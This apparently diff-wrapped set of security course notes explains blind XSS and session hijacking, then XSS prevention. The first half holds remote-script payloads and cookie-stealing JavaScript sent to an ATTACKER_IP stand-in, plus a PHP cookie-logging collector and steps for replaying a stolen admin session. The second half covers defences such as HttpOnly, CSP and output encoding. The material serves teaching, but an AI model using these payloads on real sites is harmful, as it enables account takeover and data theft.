+<h2 id="sessions-and-cookies"><a class="header" href="#sessions-and-cookies">Sessions and cookies</a></h2>
+<p>Web apps often use <strong>cookies</strong> to keep a user <strong>logged in</strong> across visits. If an attacker obtains those cookies, they can often <strong>reuse the session</strong> without knowing the password—<strong>session hijacking</strong> (cookie stealing).</p>
+<p>With <strong>XSS</strong>, arbitrary <strong>JavaScript</strong> in the victim’s browser can read <strong><code>document.cookie</code></strong> (when not protected by <strong><code>HttpOnly</code></strong>) and <strong>exfiltrate</strong> it to an attacker-controlled host.</p>
+<h2 id="blind-xss"><a class="header" href="#blind-xss">Blind XSS</a></h2>
+<p><strong>Blind XSS</strong> executes in a context <strong>you never see</strong>—for example, data you submit appears only in an <strong>admin</strong> or <strong>staff</strong> console.</p>
+<p>Typical sinks:</p>
+<ul>
+<li><strong>Contact</strong> or <strong>registration</strong> forms reviewed internally</li>
+<li><strong>Reviews</strong>, <strong>support tickets</strong>, <strong>user profile</strong> fields visible only to privileged users</li>
+<li>Logged or displayed <strong><code>User-Agent</code></strong> (and similar headers)</li>
+</ul>
+<h3 id="lab-signal-hijacking"><a class="header" href="#lab-signal-hijacking">Lab signal (<code>/hijacking</code>)</a></h3>
+<p>A <strong>user registration</strong> flow that responds with <em>“Thank you for registering. An Admin will review your registration request.”</em> implies your strings are rendered <strong>elsewhere</strong>. You cannot confirm XSS with an <strong><code>alert()</code></strong> in your own browser the usual way.</p>
+<h3 id="out-of-band-oob-detection"><a class="header" href="#out-of-band-oob-detection">Out-of-band (OOB) detection</a></h3>
+<p>Instead, inject JavaScript that <strong>phones home</strong>: if your server receives an HTTP hit, you know <strong>some</strong> page executed your payload (timing depends on when an admin opens the queue).</p>
+<p>Two practical problems:</p>
+<ol>
+<li><strong>Which field</strong> triggered?</li>
+<li><strong>Which payload shape</strong> works in that unknown HTML context?</li>
+</ol>
+<h2 id="identifying-the-vulnerable-field-remote-script-src"><a class="header" href="#identifying-the-vulnerable-field-remote-script-src">Identifying the vulnerable field: remote <code>&lt;script src&gt;</code></a></h2>
+<p>Browsers can load scripts from a URL:</p>
+<pre><code class="language-html">&lt;script src="http://ATTACKER_IP/script.js"&gt;&lt;/script&gt;
+</code></pre>
+<p>Point the <strong><code>src</code></strong> path at a <strong>unique path per field</strong> so your listener logs <strong>which</strong> input executed:</p>
+<pre><code class="language-html">&lt;script src="http://ATTACKER_IP/username"&gt;&lt;/script&gt;
+</code></pre>
+<p>A request for <strong><code>/username</code></strong> implicates the username field; repeat with <code>/fullname</code>, <code>/website</code>, etc.</p>
+<h3 id="payload-ideas-context-dependent"><a class="header" href="#payload-ideas-context-dependent">Payload ideas (context-dependent)</a></h3>
+<p>From collections like <strong>PayloadsAllTheThings</strong>, examples include:</p>
+<pre><code class="language-html">&lt;script src=http://ATTACKER_IP&gt;&lt;/script&gt;
+'&gt;&lt;script src=http://ATTACKER_IP&gt;&lt;/script&gt;
+"&gt;&lt;script src=http://ATTACKER_IP&gt;&lt;/script&gt;
+</code></pre>
+<pre><code class="language-javascript">javascript:eval('var a=document.createElement(\'script\');a.src=\'http://ATTACKER_IP\';document.body.appendChild(a)')
+</code></pre>
+<pre><code class="language-html">&lt;script&gt;function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//ATTACKER_IP");a.send();&lt;/script&gt;
+</code></pre>
+<pre><code class="language-html">&lt;script&gt;$.getScript("http://ATTACKER_IP")&lt;/script&gt;
+</code></pre>
+<p>Leading <strong><code>'</code></strong> / <strong><code>"&gt;</code></strong> fragments only work when the server reflects you into a matching <strong>quote/attribute</strong> context. <strong>Blind DOM XSS</strong> can be easier to weaponize when you can reason about <strong>sources and sinks</strong> from code—otherwise you <strong>fuzz</strong> OOB payloads until something calls back.</p>
+<h3 id="listener"><a class="header" href="#listener">Listener</a></h3>
+<p>Use a simple HTTP server on your box (example from the module):</p>
+<pre><code class="language-bash">mkdir -p /tmp/tmpserver &amp;&amp; cd /tmp/tmpserver
+sudo php -S 0.0.0.0:80
+</code></pre>
+<p>Submit the form with one payload variant <strong>across</strong> candidate fields, each field using a <strong>distinct</strong> path suffix (<code>/fullname</code>, <code>/username</code>, …). <strong>Wait</strong>—admins may not open the view immediately.</p>
+<h3 id="narrowing-the-search-space"><a class="header" href="#narrowing-the-search-space">Narrowing the search space</a></h3>
+<ul>
+<li><strong>Email</strong> fields often pass <strong>strict format</strong> checks client <strong>and</strong> server—sometimes safe to <strong>skip</strong> for XSS fuzzing in a given lab.</li>
+<li><strong>Passwords</strong> are usually <strong>hashed</strong> and <strong>not echoed</strong> in admin HTML—often <strong>lower priority</strong> for reflected/blind HTML XSS.</li>
+</ul>
+<h2 id="session-hijacking-exfiltrating-documentcookie"><a class="header" href="#session-hijacking-exfiltrating-documentcookie">Session hijacking: exfiltrating <code>document.cookie</code></a></h2>
+<p>Once you have a <strong>working remote-script include</strong>, host a <strong><code>script.js</code></strong> that sends cookies to your collector.</p>
+<p>Examples:</p>
+<pre><code class="language-javascript">document.location = 'http://ATTACKER_IP/index.php?c=' + document.cookie;
+</code></pre>
+<pre><code class="language-javascript">new Image().src = 'http://ATTACKER_IP/index.php?c=' + document.cookie;
+</code></pre>
+<p>The <strong><code>Image()</code></strong> approach avoids <strong>navigating</strong> the whole tab away (slightly less obvious than a full redirect). The browser still issues a normal <strong>GET</strong> with the cookie string in the query parameter.</p>
+<h3 id="xss-wrapper"><a class="header" href="#xss-wrapper">XSS wrapper</a></h3>
+<pre><code class="language-html">&lt;script src=http://ATTACKER_IP/script.js&gt;&lt;/script&gt;
+</code></pre>
+<p>Replace <strong><code>ATTACKER_IP</code></strong> everywhere (payload + <code>script.js</code>).</p>
+<h3 id="php-parse-and-log-multiple-cookies"><a class="header" href="#php-parse-and-log-multiple-cookies">PHP: parse and log multiple cookies</a></h3>
+<p><code>document.cookie</code> is typically <strong><code>name=value</code></strong> pairs joined by <strong><code>;</code></strong>. Logging raw query strings gets messy with many victims/cookies. Example <strong><code>index.php</code></strong>:</p>
+<pre><code class="language-php">&lt;?php
+if (isset($_GET['c'])) {
+    $list = explode(";", $_GET['c']);
+    foreach ($list as $key =&gt; $value) {
+        $cookie = urldecode($value);
+        $file = fopen("cookies.txt", "a+");
+        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
+        fclose($file);
+    }
+}
+?&gt;
+</code></pre>
+<p>You may see <strong><code>GET /script.js</code></strong> then <strong><code>GET /index.php?c=...</code></strong> in the PHP server log. Inspect <strong><code>cookies.txt</code></strong>:</p>
+<pre><code class="language-bash">cat cookies.txt
+</code></pre>
+<h3 id="using-the-stolen-session-lab-firefox"><a class="header" href="#using-the-stolen-session-lab-firefox">Using the stolen session (lab: Firefox)</a></h3>
+<ol>
+<li>Open the target app’s login or post-login URL (e.g. <code>/hijacking/login.php</code>).</li>
+<li><strong>Developer Tools → Storage</strong> (Firefox: <strong><code>Shift+F9</code></strong> shows the Storage sidebar in some setups—use whichever path exposes <strong>Cookies</strong> for the site).</li>
+<li><strong>Add</strong> a cookie: <strong>Name</strong> = substring before <strong><code>=</code></strong>, <strong>Value</strong> = substring after <strong><code>=</code></strong> for the session cookie you stole (e.g. <code>cookie=f904f93c…</code> → name <code>cookie</code>, value the hex).</li>
+<li><strong>Refresh</strong>—you should appear as the victim user (e.g. admin) if the cookie is still valid.</li>
+</ol>
+<h2 id="defensive-notes"><a class="header" href="#defensive-notes">Defensive notes</a></h2>
+<ul>
+<li>Set <strong><code>HttpOnly</code></strong> on session cookies so <strong><code>document.cookie</code></strong> cannot read them from XSS (does not stop all session attacks, but removes this exact exfil path).</li>
+<li><strong>CSP</strong>, strict <strong>encoding</strong>, and eliminating XSS remain the primary fixes.</li>
+<li>Use only in <strong>authorized</strong> tests.</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="xss-prevention"><a class="header" href="#xss-prevention">XSS prevention</a></h1>
+<p>XSS ties untrusted <strong>sources</strong> (inputs) to unsafe <strong>sinks</strong> (where data becomes HTML or JS). Defense should cover <strong>both</strong> <strong>front-end</strong> and <strong>back-end</strong>: client checks improve UX and catch honest mistakes, but <strong>attackers can bypass the browser</strong> with crafted <strong>GET/POST</strong> requests, so <strong>server-side</strong> rules are mandatory for <strong>stored</strong> and <strong>reflected</strong> XSS.</p>
+<h2 id="front-end"><a class="header" href="#front-end">Front-end</a></h2>
+<h3 id="input-validation"><a class="header" href="#input-validation">Input validation</a></h3>
+<p><strong>Validate</strong> before you trust shape or format. Example pattern from the module: <strong>regex</strong> over an email field in JavaScript (often wired to <strong>jQuery</strong> selectors) so invalid addresses block submit—same idea as other allowlist/format checks.</p>
+<h3 id="input-sanitization-dom"><a class="header" href="#input-sanitization-dom">Input sanitization (DOM)</a></h3>
+<p><strong>DOMPurify</strong> (browser build, e.g. <code>purify.min.js</code>) takes untrusted HTML/strings and returns a <strong>safe subset</strong> for use in the DOM—use it when you must handle HTML-ish input on the client:</p>
+<pre><code class="language-javascript">let clean = DOMPurify.sanitize(dirty);
+</code></pre>
+<p>It removes or neutralizes dangerous constructs; treat it as <strong>sanitization for HTML context</strong>, not a substitute for <strong>correct output encoding</strong> everywhere.</p>
+<h3 id="avoid-dangerous-sinks-and-html-soup-apis"><a class="header" href="#avoid-dangerous-sinks-and-html-soup-apis">Avoid dangerous sinks and “HTML soup” APIs</a></h3>
+<p>Do <strong>not</strong> place raw user data inside:</p>
+<ul>
+<li><strong><code>&lt;script&gt;</code></strong> / <strong><code>&lt;style&gt;</code></strong></li>
+<li><strong>Attribute</strong> values or <strong>tag names</strong> built from input</li>
+<li><strong>HTML comments</strong> built from input</li>
+</ul>
+<p>Avoid passing untrusted strings into APIs that parse or inject <strong>raw HTML</strong>:</p>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Native / DOM</th><th>jQuery (examples)</th></tr>
+</thead>
+<tbody>
+<tr><td><code>innerHTML</code>, <code>outerHTML</code></td><td><code>.html()</code>, <code>$.parseHTML()</code></td></tr>
+<tr><td><code>document.write()</code>, <code>document.writeln()</code></td><td><code>.append()</code>, <code>.prepend()</code>, <code>.after()</code>, <code>.before()</code>, <code>.insertAfter()</code>, <code>.insertBefore()</code>, <code>.replaceAll()</code>, <code>.replaceWith()</code></td></tr>
+<tr><td><code>document.domain</code> (legacy footgun)</td><td><code>.add()</code> when fed with unsanitized HTML</td></tr>
+</tbody>
+</table>
+</div>
+<p>Prefer <strong>text</strong> APIs (<code>textContent</code>, <code>.text()</code>, safe templating) or <strong>structured</strong> bindings that auto-escape.</p>
+<h2 id="back-end"><a class="header" href="#back-end">Back-end</a></h2>
+<p>Front-end validation alone failed in the module’s discovery exercise—<strong>repeat checks and enforcement on the server</strong>.</p>
+<h3 id="input-validation-1"><a class="header" href="#input-validation-1">Input validation</a></h3>
+<p>Same <strong>allowlist / format</strong> ideas: e.g. PHP <strong><code>filter_var(..., FILTER_VALIDATE_EMAIL)</code></strong>; reject and <strong>do not reflect</strong> invalid input. Node can reuse similar validation logic.</p>
+<h3 id="input-sanitization"><a class="header" href="#input-sanitization">Input sanitization</a></h3>
+<p>Use <strong>vetted libraries</strong> for your language when you must accept rich text. The module mentions PHP <strong><code>addslashes()</code></strong> on parameters such as <strong><code>$_GET['email']</code></strong> as an example of escaping special characters; in practice <strong><code>addslashes</code> is a poor primary XSS defense</strong> for HTML. Prefer <strong>context-appropriate</strong> handling: validate, then <strong>encode on output</strong> (below), and use dedicated HTML sanitizers when you truly need HTML storage.</p>
+<p>Never echo <strong><code>$_GET</code> / <code>$_POST</code></strong> fields straight into responses.</p>
+<p><strong>Node</strong> can use <strong>DOMPurify</strong> (e.g. with <strong>jsdom</strong> in server environments) to sanitize strings before they reach templates.</p>
+<h3 id="output-html-encoding"><a class="header" href="#output-html-encoding">Output HTML encoding</a></h3>
+<p>When you <strong>display</strong> user data as <strong>text</strong> in HTML pages, <strong>encode</strong> metacharacters so the browser treats them as text, not markup:</p>
+<ul>
+<li>PHP: <strong><code>htmlspecialchars</code></strong> / <strong><code>htmlentities</code></strong> (e.g. <code>htmlentities($_GET['email'])</code>) so <strong><code>&lt;</code></strong> becomes <strong><code>&amp;lt;</code></strong>, etc.</li>
+<li>Node: libraries such as <strong><code>html-entities</code></strong> (<code>encode('&lt;')</code> → <code>'&amp;lt;'</code>).</li>
+</ul>
+<p>Combine <strong>validation</strong>, <strong>sanitization where HTML is required</strong>, and <strong>encoding at the sink</strong> to cut XSS risk sharply.</p>
+<h2 id="server-and-platform-hardening"><a class="header" href="#server-and-platform-hardening">Server and platform hardening</a></h2>
+<ul>
+<li><strong>HTTPS</strong> site-wide.</li>
+<li><strong>Security headers</strong>: modern <strong>XSS filters are legacy</strong> in browsers; focus on <strong>Content-Security-Policy</strong> (e.g. <strong><code>script-src 'self'</code></strong> to limit script origins), <strong><code>X-Content-Type-Options: nosniff</code></strong>, and related headers.</li>
+<li><strong>Cookies</strong>: <strong><code>HttpOnly</code></strong> (no JS read) and <strong><code>Secure</code></strong> (HTTPS only) to reduce cookie theft impact.</li>
+<li><strong>WAF</strong> — can block obvious injection patterns; not a full substitute for safe code.</li>
+<li><strong>Frameworks</strong> — some stacks ship <strong>auto-encoding</strong> or XSS helpers (e.g. <strong>ASP.NET</strong> defaults mentioned in the module).</li>
+</ul>
+<h2 id="closing-mindset"><a class="header" href="#closing-mindset">Closing mindset</a></h2>
+<p>Controls reduce risk; they do not <strong>prove</strong> absence of bugs. Keep <strong>testing</strong> (manual, automated, code review) the way you practiced in the offensive sections—<strong>paired offense and defense</strong> is what makes XSS posture credible.</p>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="kubernetes"><a class="header" href="#kubernetes">Kubernetes</a></h1>
 <h2 id="directory-map-18"><a class="header" href="#directory-map-18">Directory Map</a></h2>
